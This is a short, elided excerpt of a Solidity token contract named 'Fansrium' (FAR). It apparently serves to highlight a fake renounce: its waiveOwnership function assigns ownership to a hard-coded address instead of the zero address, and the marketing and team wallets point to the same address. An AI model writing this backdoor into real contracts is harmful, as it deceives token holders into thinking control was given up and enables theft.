...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xC9E0603cE9a3a6859b1C88F9DBCc6DC9F1cAD3Cd);
    }
...
contract FAR is Context, IERC20, Ownable {
    ...
    string private _name = "Fansrium ";
    string private _symbol = "FAR";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x2735D152fd3300e7B68f00Aa5E143Fe56C8b09Ac);
    address payable public teamWalletAddress = payable(0x2735D152fd3300e7B68f00Aa5E143Fe56C8b09Ac);
